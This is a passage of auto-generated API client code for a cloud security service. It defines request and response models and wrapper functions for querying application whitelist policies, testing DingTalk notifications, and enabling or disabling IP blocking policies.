      uuid?: string(name='Uuid', description='The UUID of the server.', example='544900ff-1be7-4655-9719-6311cecb3****'),
    }
  ](name='Assets', description='The servers on which the policy takes effect.'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB39****'),
  totalCount?: int32(name='TotalCount', description='The total number of the servers on which the policy takes effect.', example='100'),
}

model DescribeWhiteListEffectiveAssetsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWhiteListEffectiveAssetsResponseBody(name='body'),
}

/**
 * @summary Queries the servers on which an application whitelist policy takes effect.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in-use, you can call this operation.
 *
 * @param request DescribeWhiteListEffectiveAssetsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWhiteListEffectiveAssetsResponse
 */
async function describeWhiteListEffectiveAssetsWithOptions(request: DescribeWhiteListEffectiveAssetsRequest, runtime: Util.RuntimeOptions): DescribeWhiteListEffectiveAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.needStatistics)) {
    query['NeedStatistics'] = request.needStatistics;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWhiteListEffectiveAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the servers on which an application whitelist policy takes effect.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in-use, you can call this operation.
 *
 * @param request DescribeWhiteListEffectiveAssetsRequest
 * @return DescribeWhiteListEffectiveAssetsResponse
 */
async function describeWhiteListEffectiveAssets(request: DescribeWhiteListEffectiveAssetsRequest): DescribeWhiteListEffectiveAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWhiteListEffectiveAssetsWithOptions(request, runtime);
}

model DescribeWhiteListProcessRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**. Pages start from page 1.', example='1'),
  desc?: int32(name='Desc', description='The sort order. Default value: descending order. Valid values:

*   **1**: ascending order
*   **2**: descending order', example='2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  orderBy?: int32(name='OrderBy', description='The item based on which you want to sort the returned results. Default value: **process type**. Valid values:

*   **1**: process type
*   **2**: degree of trustability', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Maximum value: 1000. Default value: 20. If you leave this parameter empty, 20 data entries are returned per page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  processName?: string(name='ProcessName', description='The name of the process.', example='sys_creat'),
  processType?: int32(name='ProcessType', description='The type of the process. Valid values:

*   **1**: trusted
*   **2**: suspicious
*   **3**: malicious', example='1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='27.223.XX.XX'),
  strategyId?: long(name='StrategyId', description='The ID of the policy.

>  You can call the [DescribeWhiteListStrategyList](~~DescribeWhiteListStrategyList~~) operation to obtain the ID.

This parameter is required.', example='8562'),
}

model DescribeWhiteListProcessResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='200'),
  processes?: [ 
    {
      filePath?: string(name='FilePath', description='The path to the process startup file.', example='/root/bash1'),
      id?: long(name='Id', description='The primary key of the process information.', example='2100019'),
      level?: int32(name='Level', description='The trust score of the process.', example='99'),
      md5?: string(name='Md5', description='The MD5 hash value of the process startup file.', example='a28e8eba54ece1f3748d80e57dc89400'),
      processId?: int32(name='ProcessId', description='The ID of the process.', example='53090'),
      processName?: string(name='ProcessName', description='The name of the process.', example='vim'),
      processType?: int32(name='ProcessType', description='The type of the process. Valid values:

*   **1**: trusted
*   **2**: suspicious
*   **3**: malicious', example='1'),
      status?: int32(name='Status', description='Indicates whether the process is trusted. Valid values:

*   **1**: no
*   **2**: yes', example='1'),
    }
  ](name='Processes', description='The information about the processes.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D81DD78E-E006-5C65-A171-C8CB09XXXXX'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model DescribeWhiteListProcessResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWhiteListProcessResponseBody(name='body'),
}

/**
 * @summary Queries the information about the processes that are detected in an application whitelist policy.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request DescribeWhiteListProcessRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWhiteListProcessResponse
 */
async function describeWhiteListProcessWithOptions(request: DescribeWhiteListProcessRequest, runtime: Util.RuntimeOptions): DescribeWhiteListProcessResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.desc)) {
    query['Desc'] = request.desc;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.orderBy)) {
    query['OrderBy'] = request.orderBy;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.processName)) {
    query['ProcessName'] = request.processName;
  }
  if (!Util.isUnset(request.processType)) {
    query['ProcessType'] = request.processType;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWhiteListProcess',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the processes that are detected in an application whitelist policy.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request DescribeWhiteListProcessRequest
 * @return DescribeWhiteListProcessResponse
 */
async function describeWhiteListProcess(request: DescribeWhiteListProcessRequest): DescribeWhiteListProcessResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWhiteListProcessWithOptions(request, runtime);
}

model DescribeWhiteListStrategyListRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='116.88.XX.XX'),
  strategyIds?: string(name='StrategyIds', description='The ID of the policy. Separate multiple IDs with commas (,).', example='1,2'),
}

model DescribeWhiteListStrategyListResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='571B2642-BF51-5BDD-906B-D2340DB9****'),
  strategies?: [ 
    {
      status?: int32(name='Status', description='The status of the policy. Valid values:

*   **0**: disabled
*   **1**: learning
*   **2**: paused
*   **3**: learning completed
*   **4**: enabled', example='1'),
      strategyId?: long(name='StrategyId', description='The ID of the policy.', example='8795555'),
      strategyName?: string(name='StrategyName', description='The name of the policy.', example='test'),
      studyTime?: int32(name='StudyTime', description='The intelligent learning duration. Unit: hour.', example='5'),
    }
  ](name='Strategies', description='The information about the policies.'),
}

model DescribeWhiteListStrategyListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWhiteListStrategyListResponseBody(name='body'),
}

/**
 * @summary Queries a list of application whitelist policies.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request DescribeWhiteListStrategyListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWhiteListStrategyListResponse
 */
async function describeWhiteListStrategyListWithOptions(request: DescribeWhiteListStrategyListRequest, runtime: Util.RuntimeOptions): DescribeWhiteListStrategyListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyIds)) {
    query['StrategyIds'] = request.strategyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWhiteListStrategyList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of application whitelist policies.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request DescribeWhiteListStrategyListRequest
 * @return DescribeWhiteListStrategyListResponse
 */
async function describeWhiteListStrategyList(request: DescribeWhiteListStrategyListRequest): DescribeWhiteListStrategyListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWhiteListStrategyListWithOptions(request, runtime);
}

model DescribeWhiteListStrategyStatisticsRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**. Pages start from page 1.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Maximum value: 1000. Default value: 20. If you leave this parameter empty, 20 data entries are returned per page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='183.63.XX.XX'),
  strategyIds?: string(name='StrategyIds', description='The ID of the policy.

>  You can call the [DescribeWhiteListStrategyList](~~DescribeWhiteListStrategyList~~) operation to obtain the ID.', example='3645'),
}

model DescribeWhiteListStrategyStatisticsResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  requestId?: string(name='RequestId', description='The request ID.', example='571B2642-BF51-5BDD-906B-D2340DB9****'),
  strategies?: [ 
    {
      assetCount?: int32(name='AssetCount', description='The number of the servers on which the policy takes effect.', example='9'),
      progress?: int32(name='Progress', description='The learning progress of the policy. Unit: percent (%).', example='80'),
      status?: int32(name='Status', description='The status of the policy. Valid values:

*   **0**: disabled
*   **1**: learning
*   **2**: paused
*   **3**: learning completed
*   **4**: enabled', example='1'),
      strategyId?: long(name='StrategyId', description='The ID of the policy.', example='11906'),
      strategyName?: string(name='StrategyName', description='The name of the policy.', example='win'),
      studyTime?: int32(name='StudyTime', description='The intelligent learning duration. Unit: hour.', example='9'),
      suspiciousProcCount?: int32(name='SuspiciousProcCount', description='The number of suspicious processes.', example='1'),
      trustProcCount?: int32(name='TrustProcCount', description='The number of trusted processes.', example='2'),
      virusProcCount?: int32(name='VirusProcCount', description='The number of malicious processes.', example='2'),
    }
  ](name='Strategies', description='The statistics of the policies.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeWhiteListStrategyStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWhiteListStrategyStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of application whitelist policies.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request DescribeWhiteListStrategyStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWhiteListStrategyStatisticsResponse
 */
async function describeWhiteListStrategyStatisticsWithOptions(request: DescribeWhiteListStrategyStatisticsRequest, runtime: Util.RuntimeOptions): DescribeWhiteListStrategyStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyIds)) {
    query['StrategyIds'] = request.strategyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWhiteListStrategyStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of application whitelist policies.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request DescribeWhiteListStrategyStatisticsRequest
 * @return DescribeWhiteListStrategyStatisticsResponse
 */
async function describeWhiteListStrategyStatistics(request: DescribeWhiteListStrategyStatisticsRequest): DescribeWhiteListStrategyStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWhiteListStrategyStatisticsWithOptions(request, runtime);
}

model DescribeWhiteListStrategyUuidCountRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='42.120.XX.XX'),
  strategyId?: long(name='StrategyId', description='The ID of the policy.

>  You can call the [DescribeWhiteListStrategyStatistics](~~DescribeWhiteListStrategyStatistics~~) operation to obtain the ID.

This parameter is required.', example='8516'),
  type?: int32(name='Type', description='The type of the policy. Valid values:

*   **1**: learning policy
*   **2**: application policy

This parameter is required.', example='1'),
}

model DescribeWhiteListStrategyUuidCountResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
  uuidCount?: int32(name='UuidCount', description='The number of the servers on which the application whitelist policy takes effect.', example='9'),
}

model DescribeWhiteListStrategyUuidCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWhiteListStrategyUuidCountResponseBody(name='body'),
}

/**
 * @summary Queries the number of the servers on which an application whitelist policy takes effect.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in-use, you can call this operation.
 *
 * @param request DescribeWhiteListStrategyUuidCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWhiteListStrategyUuidCountResponse
 */
async function describeWhiteListStrategyUuidCountWithOptions(request: DescribeWhiteListStrategyUuidCountRequest, runtime: Util.RuntimeOptions): DescribeWhiteListStrategyUuidCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWhiteListStrategyUuidCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of the servers on which an application whitelist policy takes effect.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in-use, you can call this operation.
 *
 * @param request DescribeWhiteListStrategyUuidCountRequest
 * @return DescribeWhiteListStrategyUuidCountResponse
 */
async function describeWhiteListStrategyUuidCount(request: DescribeWhiteListStrategyUuidCountRequest): DescribeWhiteListStrategyUuidCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWhiteListStrategyUuidCountWithOptions(request, runtime);
}

model DingTalkOnlineTestRequest {
  id?: long(name='Id', description='The ID of the DingTalk notification configuration.
> You can call the [DescribeDingTalk](~~DescribeDingTalk~~) operation to obtain the ID.

This parameter is required.', example='2373'),
}

model DingTalkOnlineTestResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2E96F605-1BE3-5954-83A5-AE96C617****'),
}

model DingTalkOnlineTestResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DingTalkOnlineTestResponseBody(name='body'),
}

/**
 * @summary Tests whether DingTalk notification configurations are valid.
 *
 * @param request DingTalkOnlineTestRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DingTalkOnlineTestResponse
 */
async function dingTalkOnlineTestWithOptions(request: DingTalkOnlineTestRequest, runtime: Util.RuntimeOptions): DingTalkOnlineTestResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DingTalkOnlineTest',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Tests whether DingTalk notification configurations are valid.
 *
 * @param request DingTalkOnlineTestRequest
 * @return DingTalkOnlineTestResponse
 */
async function dingTalkOnlineTest(request: DingTalkOnlineTestRequest): DingTalkOnlineTestResponse {
  var runtime = new Util.RuntimeOptions{};
  return dingTalkOnlineTestWithOptions(request, runtime);
}

model DisableBruteForceRecordRequest {
  blockIp?: string(name='BlockIp', description='The IP address that you want to specify in the policy.

This parameter is required.', example='8.210.XX.XX'),
  bound?: string(name='Bound', description='The traffic direction that you want to specify in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in'),
  id?: long(name='Id', description='The ID of the IP address blocking policy.

> You can call the [DescribeBruteForceRecords](~~DescribeBruteForceRecords~~) operation to query the policy ID.', example='114166XX'),
  port?: string(name='Port', description='The port number.'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuid?: string(name='Uuid', description='The UUID of the server.

This parameter is required.', example='cbb9aa80-a8d1-443c-9ff0-2c36cd39****'),
}

model DisableBruteForceRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5EFF53F7-9B2A-58B5-AD06-6B07ACE17133'),
}

model DisableBruteForceRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DisableBruteForceRecordResponseBody(name='body'),
}

/**
 * @summary Disables an IP address blocking policy that is in effect.
 *
 * @param request DisableBruteForceRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DisableBruteForceRecordResponse
 */
async function disableBruteForceRecordWithOptions(request: DisableBruteForceRecordRequest, runtime: Util.RuntimeOptions): DisableBruteForceRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DisableBruteForceRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Disables an IP address blocking policy that is in effect.
 *
 * @param request DisableBruteForceRecordRequest
 * @return DisableBruteForceRecordResponse
 */
async function disableBruteForceRecord(request: DisableBruteForceRecordRequest): DisableBruteForceRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return disableBruteForceRecordWithOptions(request, runtime);
}

model DisableCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', description='The IP address that is specified in the policy.

> You can call the [DescribeCustomBlockRecords](~~DescribeCustomBlockRecords~~) operation to query the IP address.

This parameter is required.', example='62.233.XX.XX'),
  bound?: string(name='Bound', description='The traffic direction that is specified in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound

This parameter is required.', example='in'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DisableCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F749D54C-3CA0-5F68-835C-AD35A2BD29EA'),
}

model DisableCustomBlockRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DisableCustomBlockRecordResponseBody(name='body'),
}

/**
 * @summary Disables a custom IP address blocking policy for servers.
 *
 * @param request DisableCustomBlockRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DisableCustomBlockRecordResponse
 */
async function disableCustomBlockRecordWithOptions(request: DisableCustomBlockRecordRequest, runtime: Util.RuntimeOptions): DisableCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DisableCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Disables a custom IP address blocking policy for servers.
 *
 * @param request DisableCustomBlockRecordRequest
 * @return DisableCustomBlockRecordResponse
 */
async function disableCustomBlockRecord(request: DisableCustomBlockRecordRequest): DisableCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return disableCustomBlockRecordWithOptions(request, runtime);
}

model EnableBruteForceRecordRequest {
  blockIp?: string(name='BlockIp', description='The IP address that is specified in the policy.

This parameter is required.', example='61.155.XX.XX'),
  bound?: string(name='Bound', description='The traffic direction that is specified in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in'),
  id?: long(name='Id', description='The ID of the policy that you want to enable.

> You can call the [DescribeBruteForceRecords](~~DescribeBruteForceRecords~~) operation to query the IDs of policies.', example='116602XX'),
  port?: string(name='Port', description='The port number.', example='22/22'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuid?: string(name='Uuid', description='The UUID of the server.

This parameter is required.', example='71046acb-8bff-4c3b-9163-24deb007****'),
}

model EnableBruteForceRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DFAECA37-4660-5EB6-9A18-8FDF56B3****'),
}

model EnableBruteForceRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: EnableBruteForceRecordResponseBody(name='body'),
}

/**
 * @summary Enables an IP address blocking policy for a specified server.
 *
 * @param request EnableBruteForceRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return EnableBruteForceRecordResponse
 */
async function enableBruteForceRecordWithOptions(request: EnableBruteForceRecordRequest, runtime: Util.RuntimeOptions): EnableBruteForceRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'EnableBruteForceRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables an IP address blocking policy for a specified server.
 *
 * @param request EnableBruteForceRecordRequest
 * @return EnableBruteForceRecordResponse
 */
async function enableBruteForceRecord(request: EnableBruteForceRecordRequest): EnableBruteForceRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return enableBruteForceRecordWithOptions(request, runtime);
}

model EnableCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', description='The IP address that is specified in the policy.

This parameter is required.', example='43.248.XX.XX'),
  bound?: string(name='Bound', description='The traffic direction that is specified in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound

This parameter is required.', example='in'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model EnableCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F02D5F26-70B9-53BD-9CDF-A316FD11****'),
}

model EnableCustomBlockRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: EnableCustomBlockRecordResponseBody(name='body'),
}

/**
 * @summary Enables a custom IP address blocking policy.
 *
 * @param request EnableCustomBlockRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return EnableCustomBlockRecordResponse
 */
async function enableCustomBlockRecordWithOptions(request: EnableCustomBlockRecordRequest, runtime: Util.RuntimeOptions): EnableCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'EnableCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables a custom IP address blocking policy.
 *
 * @param request EnableCustomBlockRecordRequest
 * @return EnableCustomBlockRecordResponse
 */
async function enableCustomBlockRecord(request: EnableCustomBlockRecordRequest): EnableCustomBlockRecordResponse {
